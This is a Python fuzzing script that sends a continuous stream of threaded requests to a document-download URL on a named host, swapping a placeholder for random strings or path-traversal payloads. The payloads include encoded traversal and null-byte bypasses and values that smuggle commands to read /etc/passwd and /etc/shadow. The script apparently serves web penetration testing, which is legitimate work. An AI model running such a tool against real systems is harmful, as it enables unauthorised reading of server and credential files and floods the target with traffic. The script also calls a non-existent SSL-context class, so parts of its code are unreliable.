import asyncio
import aiohttp
import random
import string
import threading
import re

# Your curl command with payload placeholder (marked with @@ for fuzzing)
curl_command = "curl --path-as-is -i -s -k -X $'GET' \
    -H $'Host: documents.host.com' -H $'Sec-Ch-Ua: \"Chromium\";v=\"129\", \"Not=A?Brand\";v=\"8\"' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'Sec-Ch-Ua-Platform: \"Windows\"' -H $'Accept-Language: de-DE,de;q=0.9' -H $'Upgrade-Insecure-Requests: 1' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6677.71 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Sec-Fetch-Site: none' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Accept-Encoding: gzip, deflate, br' -H $'If-Modified-Since: Thu, 17 Oct 2024 08:42:01 GMT' -H $'Priority: u=0, i' -H $'Connection: keep-alive' \
    $'https://documents.host.com/id/@@_de_20221114-112935_ch.pdf'"

proxy_url = "http://127.0.0.1:8080"
custom_ssl_cert_path = None  # Set to your custom SSL certificate path if needed

# Parse the cURL command to extract method, headers, and URL
def parse_curl_command(command):
    method = re.search(r"-X \$'(\w+)'", command).group(1)
    url = re.search(r"\$'(https?://[^\s]+)'", command).group(1)
    headers = dict(re.findall(r"-H \$'([^:]+):\s?([^']+)'", command))
    data_match = re.search(r"--data-binary \$'(.*?)'", command, re.DOTALL)
    data = data_match.group(1) if data_match else None
    cookies_match = re.search(r"-b \$'([^']+)'", command)
    cookies = cookies_match.group(1) if cookies_match else None
    return method, url, headers, data, cookies

method, url, headers, data, cookies  = parse_curl_command(curl_command)

# Fuzzing modes
FUZZ_MODE_RANDOM = "random"
FUZZ_MODE_TRAVERSAL = "traversal"
fuzz_mode = FUZZ_MODE_RANDOM  # Set the fuzzing mode here

# Define the character sets to use for fuzzing (for random input)
charsets = {
    'alpha': string.ascii_letters,
    'numeric': string.digits,
    'alphanumeric': string.ascii_letters + string.digits,
    'special': string.punctuation
}

# Path traversal payloads for fuzzing
path_traversal_payloads = [
    "../../",
    "../../../",
    "/../../../^^",
    "/../../",
    "/././././",
    "/./././././",
    "\\..\\..\\..\\",
    "..\\..\\..\\..\\",
    "/..\\/..\\/..\\/",
    ".\\/./.\\/./",
    "\\..\\..\\",
    "..\\..\\",
    "/%2e%2e%2",
    "/%2e%2e%2",
    "%0a/bin/",
    "%00/etc/",
    "%00../../",
    "/..%c0%af../..%c0%af../",
    "/%2e%2e/%2e%2e/%2e%2e/",
    "%25%5c..%25%5c..%25%5c..%25%5c",
    "/%25%5c..%25%5c..%25%5c..%25%5c",
    "\\'/bin/cat /etc/passwd\\'",
    "\\'/bin/cat /etc/shadow\\'",
    "C:/inetpub/wwwroot/",
    "C:\\inetpub\\wwwroot\\",
    "C:/",
    "C:\\",
    "/../../../",
    "/..\\../..\\../..\\../",
    "/.\\/./.\\/./.\\/",
    "/.../.../",
    "..%c0%af../..%c0%af../",
    "/%2e%2e/%2e%2e/%2e%2e/",
    "Ã°ÂÂÂ¨Ã°ÂÂÂ»Ã¢ÂÂÃ°ÂÂÂ",
    "lð¨ð»âð",
    "Ã¢ÂÂ",
    "/../œ∑´®†¥¨ˆøπ“‘",
    "👨🏻‍🚀",
]

min_length = 1
max_length = 20
num_threads = 10

# Function to handle errors and keep shooting
async def make_request(session, url, method, headers, data, proxy_url):
    try:
        async with session.request(method, url, headers=headers, data=data, proxy=proxy_url) as response:
            print(f"[*] URL: {url} | Status: {response.status}")
    except aiohttp.ClientConnectionError as e:
        print(f"[!] Connection error: {e}")
    except aiohttp.ClientConnectorError as e:
        print(f"[!] Connector error: {e}")
    except aiohttp.ClientPayloadError as e:
        print(f"[!] Payload error: {e}")
    except aiohttp.ClientError as e:
        print(f"[!] Unexpected error: {e}")
    except Exception as e:
        print(f"[!] General error: {e}")

# Generate and make requests continuously, fuzzing payload positions
async def generate_and_make_requests(session, url, method, headers, data, proxy_url, fuzz_mode):
    while True:
        if fuzz_mode == FUZZ_MODE_RANDOM:
            # Generate random payload
            length = random.randint(min_length, max_length)
            charset = random.choice(list(charsets.keys()))
            payload = ''.join(random.choice(charsets[charset]) for _ in range(length))
        elif fuzz_mode == FUZZ_MODE_TRAVERSAL:
            # Use path traversal payloads
            payload = random.choice(path_traversal_payloads)

        # Fuzz the URL and headers by replacing the placeholder @@ with the generated payload
        fuzzed_url = url.replace('@@', payload)
        fuzzed_headers = {key: value.replace('@@', payload) for key, value in headers.items()}

        print(f"[*] Generated payload: {payload}")
        print(f"[*] Making request to: {fuzzed_url}")

        await make_request(session, fuzzed_url, method, fuzzed_headers, data, proxy_url)

async def run():
    ssl_context = False  # Disable SSL verification by default
    if custom_ssl_cert_path:
        ssl_context = aiohttp.ClientSSLContext()
        ssl_context.load_verify_locations(custom_ssl_cert_path)

    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
        tasks = []
        for _ in range(num_threads):
            task = generate_and_make_requests(session, url, method, headers, None, proxy_url, fuzz_mode)
            tasks.append(task)
        await asyncio.gather(*tasks)

def thread_worker():
    asyncio.run(run())

threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=thread_worker)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()
